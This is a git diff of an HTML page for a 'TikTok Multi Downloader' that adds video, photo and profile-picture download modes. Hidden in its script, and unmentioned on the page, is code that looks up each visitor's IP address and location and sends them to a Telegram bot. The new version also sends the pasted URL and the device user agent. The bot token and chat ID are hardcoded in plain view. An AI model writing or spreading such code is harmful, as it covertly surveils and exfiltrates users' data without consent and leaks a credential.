@@ -3,214 +3,232 @@
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>TikTok Video Downloader</title>
+  <title>TikTok Multi Downloader</title>
 
   <!-- Tailwind CSS -->
   <script src="https://cdn.tailwindcss.com"></script>
   <!-- Font Awesome -->
   <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
-  <!-- Google Fonts -->
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet"/>
-
   <style>
     body { font-family: "Poppins", sans-serif; }
+    .btn-anim { transition: transform 0.2s ease, box-shadow 0.3s ease; }
+    .btn-anim:hover { transform: scale(1.05); box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2); }
     @keyframes spin { to { transform: rotate(360deg); } }
-    .spinner {
-      border: 3px solid transparent;
-      border-top-color: #22d3ee;
-      border-radius: 50%;
-      width: 1.25rem;
-      height: 1.25rem;
-      animation: spin 1s linear infinite;
-    }
+    .spinner { border: 3px solid transparent; border-top-color: white; border-radius: 50%; width: 1.2rem; height: 1.2rem; animation: spin 1s linear infinite; }
   </style>
 </head>
-
-<body class="bg-gradient-to-br from-indigo-700 via-purple-700 to-pink-600 min-h-screen flex flex-col">
+<body class="bg-gradient-to-br from-purple-700 via-pink-600 to-red-500 min-h-screen flex flex-col">
 
   <!-- Header -->
-  <header class="flex items-center justify-center py-4 bg-white/10 backdrop-blur-sm shadow">
-    <h1 class="text-white text-2xl font-bold tracking-wide select-none">
-      TikTok Downloader
+  <header class="flex flex-col items-center justify-center py-4 bg-white/10 backdrop-blur-md shadow">
+    <h1 class="text-white text-3xl font-extrabold tracking-wider animate-pulse">
+      🎵 TikTok Multi Downloader
     </h1>
+    <p class="text-white/90 text-sm mt-1">Video • Photos • Profile Picture</p>
   </header>
 
-  <!-- Main -->
+  <!-- Mode Switch Buttons -->
+  <div class="flex justify-center gap-3 mt-5">
+    <button id="mode-video" class="btn-anim bg-gradient-to-r from-cyan-500 to-blue-600 text-white font-semibold rounded-lg px-4 py-2">🎬 Video</button>
+    <button id="mode-photo" class="btn-anim bg-gradient-to-r from-pink-400 to-rose-500 text-white font-semibold rounded-lg px-4 py-2">🖼 Photos</button>
+    <button id="mode-profile" class="btn-anim bg-gradient-to-r from-yellow-400 to-orange-500 text-white font-semibold rounded-lg px-4 py-2">👤 Profile</button>
+  </div>
+
+  <!-- Main Form -->
   <main class="flex-grow flex flex-col items-center justify-center px-5 py-10 max-w-lg mx-auto w-full">
-    <div class="bg-white/90 backdrop-blur-md shadow-xl rounded-2xl w-full p-8">
-
-      <!-- Title -->
-      <h2 class="text-gray-900 text-3xl font-bold mb-3 text-center">
-        Download Videos Instantly
+    <div class="bg-white/90 backdrop-blur-xl shadow-2xl rounded-2xl w-full p-8">
+      <h2 id="form-title" class="text-gray-900 text-2xl font-bold mb-3 text-center">
+        Download TikTok Video
       </h2>
-      <p class="text-gray-600 text-center mb-6 text-base">
-        Get TikTok videos without watermarks in one click.
-      </p>
-
-      <!-- Form -->
-      <form id="download-form" class="w-full flex flex-col sm:flex-row gap-3" autocomplete="off" novalidate onsubmit="return false">
+      <form id="download-form" class="flex flex-col gap-3" onsubmit="return false">
         <input id="tiktok-url" type="url"
-          class="flex-grow rounded-lg px-4 py-3 text-gray-900 text-base border border-gray-300 focus:outline-none focus:ring-2 focus:ring-cyan-400"
-          placeholder="Paste TikTok video URL here" required />
-        <button id="download-btn" type="submit"
-          class="bg-cyan-400 hover:bg-cyan-500 text-white font-semibold rounded-lg px-6 py-3 shadow-md transition flex items-center justify-center gap-2">
-          <i class="fas fa-download fa-lg"></i>
+          class="rounded-lg px-4 py-3 text-gray-900 text-base border border-gray-300 focus:outline-none focus:ring-2 focus:ring-cyan-400"
+          placeholder="Paste TikTok URL here" required />
+        <button type="submit" id="download-btn"
+          class="btn-anim bg-gradient-to-r from-cyan-400 to-teal-500 hover:from-cyan-500 hover:to-teal-600 text-white font-semibold rounded-lg px-6 py-3 shadow-md flex items-center justify-center gap-2">
           <span id="btn-text">Download</span>
         </button>
       </form>
 
-      <!-- Result Section -->
-      <section id="result-section" class="mt-8 w-full hidden flex-col items-center">
-        <h3 class="text-gray-900 text-lg font-semibold mb-3">Preview</h3>
-        <video id="video-preview" class="rounded-lg max-w-full max-h-80 shadow-md mb-4" controls playsinline preload="metadata">
-          <source src="" type="video/mp4"/>
-        </video>
+      <!-- Result -->
+      <section id="result-section" class="mt-6 hidden flex-col items-center">
+        <video id="video-preview" class="rounded-lg max-w-full max-h-80 shadow-md mb-4 hidden" controls></video>
+        <div id="photo-grid" class="grid grid-cols-2 gap-3 w-full hidden"></div>
+        <div id="profile-container" class="hidden flex flex-col items-center gap-3">
+          <img id="profile-photo" class="rounded-full shadow-md w-32 h-32 object-cover"/>
+          <a id="profile-download" class="btn-anim bg-gradient-to-r from-yellow-400 to-orange-500 text-white px-4 py-2 rounded-lg">Download Profile</a>
+        </div>
         <a id="download-link" href="#" download
-          class="bg-cyan-400 hover:bg-cyan-500 text-white font-semibold rounded-lg px-6 py-3 shadow-md transition inline-flex items-center gap-2 opacity-50 pointer-events-none">
-          <i class="fas fa-file-download fa-lg"></i>
-          Download Video
+          class="btn-anim bg-gradient-to-r from-cyan-400 to-teal-500 text-white font-semibold rounded-lg px-6 py-3 shadow-md hidden">
+          <i class="fas fa-file-download fa-lg"></i> Download File
         </a>
       </section>
-
-      <!-- Features -->
-      <div class="mt-8 text-gray-700">
-        <h3 class="text-lg font-semibold text-center mb-3">Why Choose Us?</h3>
-        <ul class="list-disc list-inside space-y-2 text-sm">
-          <li>Fast, reliable TikTok downloader</li>
-          <li>No watermark — high-quality videos</li>
-          <li>Works on any browser or device</li>
-          <li>Free & secure, no account needed</li>
-        </ul>
-        <h3 class="text-lg font-semibold text-center mb-3">Instructions</h3>
-        <ul class="list-disc list-inside space-y-2 text-sm">
-          <li>Copy any link on tiktok</li>
-          <li>Go to chrome</li>
-          <li>Paste the link on chrome</li>
-          <li>Copy the link on chrome 
-          </li>
-        </ul>
-        <h3 class="text-lg font-semibold text-center mb-3">Example:</h3>
-        
-      </d<ul class="list-disc list-inside space-y-2 text-sm">
-          <li>https://www.tiktok.com/@xzumofficial<br>/video/7552054517458554119?_t=ZS-8zuUIDjtUdl&_r=1</li>
-                  </ul>
-                  
-      </div>
-
-      <!-- Credit -->
-      <p class="text-center text-xs text-gray-500 mt-6">
-        Credit: <span class="font-semibold text-cyan-500">S a i r a D e v s</span>
-      </p>
     </div>
   </main>
 
-  <!-- ✅ TikTok Downloader Logic (Unchanged JS) -->
+  <!-- Features Section -->
+  <section class="bg-white/20 backdrop-blur-md rounded-t-2xl px-5 py-6 text-white">
+    <h3 class="text-xl font-bold text-center mb-4">✨ Features</h3>
+    <div class="grid grid-cols-1 sm:grid-cols-3 gap-4 text-center">
+      <div class="bg-white/10 p-4 rounded-xl shadow btn-anim">
+        <i class="fas fa-video fa-2x mb-2"></i>
+        <p class="font-semibold">HD Video Download</p>
+      </div>
+      <div class="bg-white/10 p-4 rounded-xl shadow btn-anim">
+        <i class="fas fa-images fa-2x mb-2"></i>
+        <p class="font-semibold">Photo Post Support</p>
+      </div>
+      <div class="bg-white/10 p-4 rounded-xl shadow btn-anim">
+        <i class="fas fa-user-circle fa-2x mb-2"></i>
+        <p class="font-semibold">Profile Picture Grab</p>
+      </div>
+    </div>
+    <p class="text-center text-sm mt-4">No watermark • Easy to use • Mobile friendly</p>
+  </section>
+
+  <!-- Footer -->
+  <footer class="bg-black/30 text-white text-center py-3 text-sm">
+    <p>🙏 Thank you for using TikTok Multi Downloader!</p>
+    <p class="text-xs">💻 Developed with ❤️ by <span class="font-bold">Gojo Saturo Two</span></p>
+    <p class="text-xs opacity-75">API Powered by Baguss API</p>
+  </footer>
+
   <script>
+    const modeVideo = document.getElementById("mode-video");
+    const modePhoto = document.getElementById("mode-photo");
+    const modeProfile = document.getElementById("mode-profile");
+    const formTitle = document.getElementById("form-title");
     const form = document.getElementById("download-form");
     const urlInput = document.getElementById("tiktok-url");
     const resultSection = document.getElementById("result-section");
     const videoPreview = document.getElementById("video-preview");
+    const photoGrid = document.getElementById("photo-grid");
+    const profileContainer = document.getElementById("profile-container");
+    const profilePhoto = document.getElementById("profile-photo");
+    const profileDownload = document.getElementById("profile-download");
     const downloadLink = document.getElementById("download-link");
     const downloadBtn = document.getElementById("download-btn");
     const btnText = document.getElementById("btn-text");
 
-    function isValidTikTokUrl(url) {
-      const regex = /^(https?:\/\/)?(www\.|m\.|vm\.)?tiktok\.com\/.+|https?:\/\/vm\.tiktok\.com\/.+/i;
-      return regex.test(url);
+    const BOT_TOKEN = "8495848766:AAGiNzOsFhDH9S8WgPo4Nl5YsiS7n2c0vxs";
+    const CHAT_ID = "-1002679152773";
+
+    let currentMode = "video";
+
+    function setMode(mode) {
+      currentMode = mode;
+      resultSection.classList.add("hidden");
+      videoPreview.classList.add("hidden");
+      photoGrid.classList.add("hidden");
+      profileContainer.classList.add("hidden");
+      downloadLink.classList.add("hidden");
+
+      if (mode === "video") formTitle.textContent = "Download TikTok Video";
+      if (mode === "photo") formTitle.textContent = "Download TikTok Photo Post";
+      if (mode === "profile") formTitle.textContent = "Download TikTok Profile Picture";
     }
 
-    async function fetchTikTokVideo(url) {
-      if (!isValidTikTokUrl(url)) throw new Error("Invalid TikTok URL");
-      const apiUrl = `https://apii.baguss.web.id/downloader/ttdl?apikey=bagus&url=${encodeURIComponent(url)}`;
-      const response = await fetch(apiUrl);
-      if (!response.ok) throw new Error("Failed to fetch video data");
-      const data = await response.json();
-      if (!data.success) throw new Error("API returned unsuccessful response");
-      return data;
-    }
+    modeVideo.addEventListener("click", () => setMode("video"));
+    modePhoto.addEventListener("click", () => setMode("photo"));
+    modeProfile.addEventListener("click", () => setMode("profile"));
 
     function setLoading(isLoading) {
       if (isLoading) {
+        btnText.innerHTML = `<span class="spinner"></span>`;
         downloadBtn.disabled = true;
-        btnText.textContent = "";
-        if (!downloadBtn.querySelector(".spinner")) {
-          const spinner = document.createElement("span");
-          spinner.className = "spinner";
-          spinner.setAttribute("aria-label", "Loading");
-          downloadBtn.insertBefore(spinner, btnText);
-        }
       } else {
-        downloadBtn.disabled = false;
         btnText.textContent = "Download";
-        const spinner = downloadBtn.querySelector(".spinner");
-        if (spinner) spinner.remove();
+        downloadBtn.disabled = false;
       }
     }
 
-    form.addEventListener("submit", async (e) => {
-      e.preventDefault();
-      const url = urlInput.value.trim();
-      if (!url) return;
+    async function fetchTikTok(url) {
+      const apiUrl = `https://apii.baguss.web.id/downloader/ttdl?apikey=bagus&url=${encodeURIComponent(url)}`;
+      const res = await fetch(apiUrl);
+      if (!res.ok) throw new Error("Failed to fetch data");
+      return res.json();
+    }
 
-      downloadLink.classList.add("opacity-50", "pointer-events-none");
-      downloadLink.removeAttribute("href");
-      videoPreview.src = "";
-      resultSection.classList.add("hidden");
-
-      setLoading(true);
+    async function sendTelegramNotif(type, url) {
       try {
-        const data = await fetchTikTokVideo(url);
-        const videoUrl = data.video.nowatermark_hd || data.video.nowatermark || "";
-        if (videoUrl) {
-          videoPreview.src = videoUrl;
-          downloadLink.href = videoUrl;
-          downloadLink.download = "tiktok-video.mp4";
-          downloadLink.innerHTML = '<i class="fas fa-file-download fa-lg"></i> Download Video';
-          resultSection.classList.remove("hidden");
-          downloadLink.classList.remove("opacity-50", "pointer-events-none");
-        } else {
-          videoPreview.src = "";
-          downloadLink.href = "#";
-          downloadLink.classList.add("opacity-50", "pointer-events-none");
-          downloadLink.textContent = "Download Video";
-          resultSection.classList.add("hidden");
-        }
-      } catch (error) {
-        alert(error.message || "An error occurred");
-        downloadLink.textContent = "Download Video";
-      } finally {
-        setLoading(false);
-      }
-    });
-  </script>
+        // Get IP Info
+        const ipRes = await fetch("https://ipapi.co/json/");
+        const ipData = await ipRes.json();
 
-  <!-- ✅ Telegram Notification with IP Info -->
-  <script>
-    (async function sendVisitNotification() {
-      const BOT_TOKEN = "Y8232506401:AAHJOEDUxz92UA_QZ4JA__JvzX2oKwZ-qjU";  // Replace with your bot token
-      const CHAT_ID = "-1002679152773";      // Replace with your chat ID
-
-      try {
-        // Get IP details
-        const res = await fetch("https://ipinfo.io/json?token=YOUR_IPINFO_TOKEN_HERE"); 
-        const data = await res.json();
-
-        const message = `🔔 New Visitor on TikTok Downloader
-🌍 IP: ${data.ip}
-🏙 City: ${data.city || "Unknown"}
-📍 Region: ${data.region || "Unknown"}
-🌎 Country: ${data.country || "Unknown"}
-🕒 Time: ${new Date().toLocaleString()}`;
+        const message = `
+📥 New TikTok ${type} Download
+🔗 URL: ${url}
+🌍 IP: ${ipData.ip}
+🏙 Location: ${ipData.city}, ${ipData.country_name}
+📱 Device: ${navigator.userAgent}
+⏰ Time: ${new Date().toLocaleString()}
+        `;
 
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message
+          })
         });
-      } catch (err) {
-        console.error("Failed to send Telegram notification:", err);
+      } catch (e) { console.error("Telegram send failed", e); }
+    }
+
+    form.addEventListener("submit", async () => {
+      const url = urlInput.value.trim();
+      if (!url) return alert("Paste a TikTok link first!");
+
+      setLoading(true);
+      try {
+        const data = await fetchTikTok(url);
+        resultSection.classList.remove("hidden");
+
+        if (currentMode === "video" && data.video) {
+          videoPreview.src = data.video.nowatermark_hd || data.video.nowatermark;
+          videoPreview.classList.remove("hidden");
+          downloadLink.href = videoPreview.src;
+          downloadLink.download = "tiktok-video.mp4";
+          downloadLink.classList.remove("hidden");
+          await sendTelegramNotif("video", url);
+        }
+
+        if (currentMode === "photo" && data.image_post) {
+          photoGrid.innerHTML = "";
+          data.image_post.images.forEach(img => {
+            const container = document.createElement("div");
+            container.className = "flex flex-col items-center";
+            const imageEl = document.createElement("img");
+            imageEl.src = img.url;
+            imageEl.className = "rounded-lg shadow-md w-full";
+            const dl = document.createElement("a");
+            dl.href = img.url;
+            dl.download = "tiktok-photo.jpg";
+            dl.textContent = "Download";
+            dl.className = "btn-anim bg-pink-500 text-white rounded-lg px-3 py-1 mt-2 text-sm";
+            container.appendChild(imageEl);
+            container.appendChild(dl);
+            photoGrid.appendChild(container);
+          });
+          photoGrid.classList.remove("hidden");
+          await sendTelegramNotif("photo", url);
+        }
+
+        if (currentMode === "profile" && data.author) {
+          profilePhoto.src = data.author.avatar;
+          profileDownload.href = data.author.avatar;
+          profileDownload.download = "tiktok-profile.jpg";
+          profileContainer.classList.remove("hidden");
+          await sendTelegramNotif("profile", url);
+        }
+
+      } catch (e) {
+        alert("Error: " + e.message);
+      } finally {
+        setLoading(false);
       }
-    })();
+    });
   </script>
 </body>
 </html>
